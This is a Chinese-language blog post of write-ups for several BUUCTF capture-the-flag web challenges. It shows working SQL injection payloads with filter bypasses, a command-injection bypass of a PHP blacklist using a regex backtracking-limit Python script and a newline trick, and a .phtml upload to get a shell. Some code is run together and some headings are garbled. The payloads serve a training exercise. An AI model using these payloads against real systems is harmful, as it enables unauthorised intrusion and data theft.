---
title: "CTF刷题buuctf"
date: "2024-10-02"
description: "拿到相关题目，其实根据功能和参数分析。需要传入一个学号然后进行针对于对应的学号进行一个查询，很可能就会存在sql注入。"
---

#### [](#WUSTCTF2020-颜值成绩查询 "[WUSTCTF2020]颜值成绩查询")\[WUSTCTF2020\]颜值成绩查询

拿到相关题目，其实根据功能和参数分析。需要传入一个学号然后进行针对于对应的学号进行一个查询，很可能就会存在sql注入。

其实这道题最难的点，在于过滤了空格，因此我们使用

```shell
/**/
```

来过滤空格的限制。  
**相关payload**

```shell
?stunum=1/**/and/**/1=1--+?stunum=1/**/and/**/1=2--+
```

我们采用and方式可以根据页面的返回结果判断成功或者失败，典型的一个布尔盲注。  
我习惯采用bp 进行盲注。

#### [](#FBCTF2019-RCEService "[FBCTF2019]RCEService")\[FBCTF2019\]RCEService

rce的点，进入之后先针对于提示将get参数传递为json格式

```shell
?cmd={"cmd":"ls"}
```

> 第一次见识到通过get传递json格式的参数。我们可以得到回显index.php

```shell
{%0a"cmd":"ls /home/rceservice"}
```

**题目有源码**

```php
<?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) {    $json = $_REQUEST['cmd'];    if (!is_string($json)) {        echo 'Hacking attempt detected<br/><br/>';    } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {        echo 'Hacking attempt detected<br/><br/>';    } else {        echo 'Attempting to run command:<br/>';        $cmd = json_decode($json, true)['cmd'];        if ($cmd !== NULL) {            system($cmd);        } else {            echo 'Invalid input';        }        echo '<br/><br/>';    }}?>
```

1.  is\_string()  
    is\_string() 主要用于确保输入是字符串类型，json格式也被当做字符串。
2.  preg\_match()  
    黑名单，这次过滤的确实很多
3.  json\_decode()  
    相当于将json格式，解码成一个数组。
4.  putenv() 设置环境变量  
    `putenv('PATH=/home/rceservice/jail');` 这行代码确实会限制可执行命令的搜索路径  
    意味着我们的命令执行会收到限制。因为系统一些命令一般都在/usr/bin下，目前我们搜索不到了。

在大多数类 Unix 系统中，`cat` 命令的常见路径是 `/bin/cat` 或者 `/usr/bin/cat`。具体使用哪个路径，通常取决于系统的配置和不同 Linux 发行版的标准。  
也就意味着/bin/cat 更具有兼容性，因此在被限制环境变量时候我们想要使用一些可执行文件，我们就必须要用/bin/cat

*   **/bin/cat**：这个路径通常包含基本的系统命令，供所有用户使用，且在系统启动时可用。
*   **/usr/bin/cat**：这个路径通常用于存放用户级的应用程序和命令

> 通过对于代码的一些分析，可以看到这道题并不是很难，我们唯一的突破点在于preg\_match()函数的绕过。而preg\_match()函数绕过有三种方式。但是数组因为有一个is\_string校验无法使用。

##### [](#回溯绕过 "回溯绕过")回溯绕过

查看flag的位置过程不做赘述，直接是ls 查看home就可以。

```shell
import requestsurl='http://5dd96313-13f8-4eb6-89eb-0dbb5a4ba30a.node3.buuoj.cn'data={    'cmd':'{"cmd":"/bin/cat /home/rceservice/flag","123":"'+'b'*1000000+'"}'}# 由于我们是把json解码成为数组,因此可以看到我们需要保留cmd方便读取，我们另外在加一个123来增加长度。r=requests.post(url=url,data=data).textprint(r)
```

##### [](#0a "%0a")%0a

这个其实比较简单,具体不做赘述。

```text
?cmd={%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a}
```

#### [](#ACTF2-极客大挑战-2019-BabySQL "[ACTF2## [极客大挑战 2019]BabySQL")\[ACTF2## \[极客大挑战 2019\]BabySQL

### [](#1020-新生赛-Upload "1020 新生赛]Upload")1020 新生赛\]Upload

测试很多，有前端校验还有后端校验。黑名单  
首先出传递1.jpg，之后再bp中改包。然后更改后缀为phtml  
访问对应的文件，拿到shell  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20241002224812.png)

#### [](#极客大挑战-2019-BabySQL "[极客大挑战 2019]BabySQL")\[极客大挑战 2019\]BabySQL

经过测试用户名和密码处两处都存在注入点。并且通过报错可以看到某些关键字被过滤。其实也就是一些关键字被过滤。我们全部使用双写绕过就可以。所以存在报错注入，布尔盲注，强制报错注入。  

```shell
 http://b1cafe94-d5ee-4133-96ff-e61ebb12b891.node5.buuoj.cn:81/check.php?username=admin&password=a'ororderder bbyy 5--+http://b1cafe94-d5ee-4133-96ff-e61ebb12b891.node5.buuoj.cn:81/check.php?username=admin'ANANDD Extractvalue(1,concat('~',()))--+&password=a
```

利用报错注入

```shell
# 拿到表http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(table_name)%20FRFROMOM%20infoORrmation_schema.tables%20WHWHEREERE%20table_schema%20=%20%27geek%27--+b4bsql,geekuse# 拿到列http://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(column_name) FRfromOM infoorrmation_schema.columns WHEwhereRE table_name = 'b4bsql' --+id username passwordhttp://5a99abb0-4048-443a-8ea1-c27f867ccd51.node5.buuoj.cn:81/check.php?username=admin&password=a%27uniunionon%20selselectect%201,2,group_concat(id,username,passwoorrd) FRfromOM b4bsql --+直接拿到flag1cl4yi_want_to_play_2077,2sqlsql_injection_is_so_fun,3porndo_you_know_pornhub,4gitgithub_is_different_from_pornhub,5Stopyou_found_flag_so_stop,6badguyi_told_you_to_stop,7hackerhack_by_cl4y,8flagflag{900b1ab5-4178-41c5-83ba-b3773993ede1}
```
